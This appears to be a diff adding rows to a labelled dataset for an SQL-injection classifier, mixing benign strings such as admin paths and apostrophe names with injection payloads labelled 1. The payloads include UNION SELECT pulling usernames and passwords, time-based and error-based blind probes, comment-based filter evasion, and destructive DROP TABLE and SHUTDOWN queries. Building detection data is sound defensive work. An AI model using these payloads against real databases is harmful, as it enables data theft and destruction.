+1 AND EXISTS(SELECT * FROM users) --,1
+1; SHUTDOWN --,1
+admin privileges are required for this action,0
+/admin/dashboard#settings,0
+"' AND BENCHMARK(800000,SHA1('a')) /**/",1
+Product Admin,0
+admin' #,1
+/manage/admin/create,0
+55458,0
+Admin Menu,0
+' /*!50000OR*/ '1'='1 --,1
+' AND exp(~(SELECT*FROM(SELECT version())a)) --+,1
+1 AND SLEEP(2) /**/,1
+"' UNION SELECT username,password FROM users --+",1
+/admin/reports,0
+payment confirmed,0
+' OR CHAR(49)=CHAR(49) #,1
+item added to cart,0
+1 OR 1=1 #,1
+/admin/panel/edit,0
+"' AND gtid_subset(version(),0) /**/",1
+O'Reilly,0
+admin' #,1
+reset via the admin console,0
+/admin/users/list,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+hello@work.co,0
+Admin Console,0
+/api/v1/admin/edit,0
+Back to Admin,0
+contact the system administrator,0
+/admin/settings,0
+/admin?page=1,0
+Super Admin,0
+"' UNION SELECT CHAR(117,115,101,114) --",1
+eve123,0
+x'; CREATE TABLE tokens (tok TEXT) --,1
+"' AND ASCII(SUBSTRING(password,1,1))>64 #",1
+x'; CREATE TABLE tokens (tok TEXT) --,1
+test.user@mail.org,0
+heidip,0
+phone case,0
+cloud admin portal login,0
+/admin/api/create,0
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' --,1
+admin tools are under maintenance,0
+'; DROP TABLE users --+,1
+"' AND ASCII(SUBSTRING(password,1,1))>64 --",1
+/admin/api/list,0
+store admin manages product listings,0
+"' AND gtid_subset(version(),0) --+",1
+' OR 1=1 --,1
+/api/v1/admin?page=1,0
+"' AND BENCHMARK(500000,SHA1('a')) --",1
+'; SHUTDOWN --+,1
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) --",1
+support@help.org,0
+it's working,0
+1; SELECT version() --,1
+"' AND gtid_subset(version(),0) #",1
+forum admin moderates posts,0
+/admin//create,0
+'/*!50000OR*//*!50000'1'*/=/*!50000'1'*/ --,1
+/admin/panel/edit,0
+' AND length(username)>8 #,1
+' AND CHAR(48)=CHAR(48) --,1
+the admin user was created successfully,0
+/admin/reports#settings,0
+"' AND ASCII(SUBSTRING(password,1,1))>64 #",1
+/admin/api#settings,0
+'/*!50000OR*//*!50000'1'*/=/*!50000'1'*/ --,1
+admin@example.org sent a notification,0
+Admin Panel,0
+dave_t,0
+x'; CREATE TABLE tokens (tok TEXT) --,1
+' OR ASCII(CHAR(49))=49 --,1
+User Admin,0
+D'Angelo,0
+today's date,0
+Open Admin View,0
+' AND SLEEP(4) --+,1
+'/*!50000OR*/1=1 --,1
+admin'/*!50000--*/,1
+forum admin moderates posts,0
+1/*!50000AND*/SLEEP(0) --,1
+today's date,0
+45785,0
+subscription renewed,0
+/*!50000UNION*//*!50000SELECT*/ null --,1
+admin's note,0
+"' AND BENCHMARK(600000,SHA1('a')) /**/",1
+1 AND SLEEP(4) #,1
+admin' AND CHAR(49)=CHAR(49) --,1
+O'Reilly,0
+' OR CHAR(49)>CHAR(48) --,1
+' OR 8=8 --+,1
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+"' UNION SELECT null,null,null #",1
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) /**/",1
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+/*!50000UNION*//*!50000SELECT*/ null --,1
+"' AND substring(username,1,1)='a' --+",1
+Admin Console,0
+"' AND ASCII(SUBSTRING(password,1,1))>64 /**/",1
+"' AND BENCHMARK(700000,SHA1('a')) --+",1
+/api/v1/admin/delete,0
+"'; SELECT CHAR(65,68,77,73,78) --",1
+Store Admin,0
+D'Arcy,0
+the admin changed the password policy,0
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+O'Neill's order,0
+contact@demo.net,0
+/admin/dashboard/delete,0
+'; CREATE TABLE backdoor (cmd TEXT) --,1
+dave_t,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+dave_t,0
+/admin/logs?tab=overview,0
+' /*!AND*/ '1'='1 --,1
+admin panel is available to staff only,0
+/admin/logs?page=1,0
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+1 OR 1=1 --+,1
+Admin Console,0
+O'Brien,0
+1 AND CHAR(49)=CHAR(49) --,1
+admin' AND CHAR(49)=CHAR(49) --,1
+Open Admin View,0
